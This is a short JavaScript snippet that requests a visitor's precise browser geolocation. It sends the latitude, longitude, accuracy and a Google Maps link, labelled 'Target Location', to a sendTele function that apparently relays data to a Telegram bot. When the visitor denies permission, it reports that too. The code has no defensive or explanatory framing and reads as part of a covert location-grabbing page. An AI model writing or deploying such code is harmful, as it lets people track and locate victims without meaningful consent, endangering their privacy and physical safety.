navigator.geolocation.getCurrentPosition(res => {
    const lat = res.coords.latitude;
    const lon = res.coords.longitude;
    const accuracy = res.coords.accuracy;
    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    sendTele(`📍 Target Location:\nAccuracy: ${accuracy} meters\nLink: ${mapLink}`);
}, err => {
    sendTele("❌ Location Denied by User");
}, { enableHighAccuracy: true });
